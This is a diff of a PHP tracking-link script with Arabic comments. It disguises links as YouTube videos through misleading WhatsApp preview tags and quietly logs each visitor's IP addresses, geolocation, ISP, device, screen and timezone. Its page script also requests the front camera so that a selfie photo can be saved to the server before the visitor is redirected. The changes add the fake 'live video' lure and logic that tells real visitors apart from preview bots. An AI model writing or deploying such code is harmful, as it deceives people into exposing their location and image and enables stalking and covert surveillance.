@@ -1,12 +1,11 @@
 <?php
-// إظهار الأخطاء للتحقق والتأكد من العمل
+// إظهار الأخطاء للتحقق
 ini_set('display_errors', 1);
 error_reporting(E_ALL);
 
 try {
     $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
 
-    // إنشاء الجداول
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT UNIQUE, 
@@ -35,7 +34,7 @@ try {
     die("خطأ في قاعدة البيانات: " . $e->getMessage());
 }
 
-// معالجة استقبال صورة السيلفي المرسلة عبر طلب AJAX
+// معالجة استقبال صورة السيلفي عبر AJAX
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) &&$_POST['action'] === 'save_photo') {
     $code =$_POST['code'] ?? '';
     $imgData =$_POST['image'] ?? '';
@@ -103,7 +102,8 @@ function get_ip_details($ip) {
         return [
             'country' => $data['country'] ?? 'غير معروف',
             'city' => $data['city'] ?? 'غير معروف',
-            'lat' => $data['lat'] ?? '36.7538', 'lon' =>$data['lon'] ?? '3.0588',
+            'lat' => $data['lat'] ?? '36.7538', 
+            'lon' =>$data['lon'] ?? '3.0588',
             'isp' => parse_isp($data['isp'] ?? '',$data['org'] ?? '')
         ];
     }
@@ -114,22 +114,20 @@ function get_ip_details($ip) {
 $og_title = "Hello World from azez";
 $og_description = "لوحة تحكم تتبع الروابط المتقدمة";
 $og_image = "";
+$target_url_redirect = "";
 
-// 1. معالجة إعادة التوجيه وجلب بيانات الرابط للمعاينة
+// فحص الكود لجلب بيانات المعاينة فوراً (حتى لو طلبها بوت واتساب)
 if (isset($_GET['r'])) {
     $code =$_GET['r'];
     $stmt =$db->prepare("SELECT target_url FROM links WHERE code = ?");
     $stmt->execute([$code]);
     $link =$stmt->fetch(PDO::FETCH_ASSOC);
 
-    if ($link) {
-        $target =$link['target_url'];
-        
-        $og_title = "انقر للمشاهدة: " . $target;
-        $og_description = "اضغط هنا لفتح المحتوى المطلوب";
+    if ($link) {$target_url_redirect = $link['target_url'];$og_title = "شاهد الفيديو المباشر";
+        $og_description = "اضغط للمشاهدة الآن عبر اليوتيوب";
 
-        // استخراج معرف فيديو يوتيوب بطريقة آمنة
-        if (strpos($target, 'youtube.com') !== false || strpos($target, 'youtu.be') !== false) {$parsed_url = parse_url($target);$video_id = "";
+        // استخراج صورة يوتيوب بدقة
+        if (strpos($target_url_redirect, 'youtube.com') !== false || strpos($target_url_redirect, 'youtu.be') !== false) {$parsed_url = parse_url($target_url_redirect);$video_id = "";
             if (isset($parsed_url['query'])) {
                 parse_str($parsed_url['query'],$query_params);
                 if (isset($query_params['v'])) {
@@ -143,32 +141,24 @@ if (isset($_GET['r'])) {
             }
         }
 
-        if (isset($_GET['capture']) &&$_GET['capture'] == '1') {
+        // إذا أرسل المتصفح معلومات الشاشة، يتم تسجيل الزيارة ثم التوجيه الفعلي
+        if (isset($_GET['screen'])) {$public_ip = get_real_ip();
+            $local_ip =$_GET['lip'] ?? 'غير متوفر';
+            $port =$_SERVER['REMOTE_PORT'] ?? 'غير متوفر';
+            $geo = get_ip_details($public_ip);
+            $ua =$_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+            $device = get_device_type($ua);
+            $screen =$_GET['screen'] ?? 'غير متوفر';
+            $tz =$_GET['tz'] ?? 'غير متوفر';
+
+            try {
+                $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, screen_res, timezone) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+                $logStmt->execute([$code,$public_ip, $local_ip,$port, $geo['country'],$geo['city'], $geo['lat'],$geo['lon'], $geo['isp'],$device, $screen,$tz]);
+            } catch (Exception $e) {}
+
+            header("Location: " . $target_url_redirect);
             exit();
         }
-
-        $public_ip = get_real_ip();
-        $local_ip =$_GET['lip'] ?? 'غير متوفر';
-        $port =$_SERVER['REMOTE_PORT'] ?? 'غير متوفر';
-        $geo = get_ip_details($public_ip);
-        $ua =$_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
-        $device = get_device_type($ua);
-        $screen =$_GET['screen'] ?? 'غير متوفر';
-        $tz =$_GET['tz'] ?? 'غير متوفر';
-
-        try {
-            $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, screen_res, timezone) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
-            $logStmt->execute([$code,$public_ip, $local_ip,$port, $geo['country'],$geo['city'], $geo['lat'],$geo['lon'], $geo['isp'],$device, $screen,$tz]);
-        } catch (Exception $e) {
-            // الاستمرار في حالة خطأ السجل
-        }
-
-        if (isset($_GET['screen'])) {
-            header("Location: " . $target);
-            exit();
-        }
-    } else {
-        die("الرابط غير موجود.");
     }
 }
 
@@ -208,6 +198,7 @@ if (!empty($filter_code)) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title><?php echo htmlspecialchars($og_title); ?></title>
     
+    <!-- وسوم المعاينة لبرامج التراسل -->
     <meta property="og:title" content="<?php echo htmlspecialchars($og_title); ?>">
     <meta property="og:description" content="<?php echo htmlspecialchars($og_description); ?>">
     <?php if (!empty($og_image)): ?>
@@ -257,6 +248,7 @@ if (!empty($filter_code)) {
             const redirectCode = urlParams.get('r');
             const hasScreen = urlParams.has('screen');
 
+            // إذا فتح المستخدم الحقيقي الرابط وليس بوت المعاينة
             if (redirectCode && !hasScreen) {
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                     navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
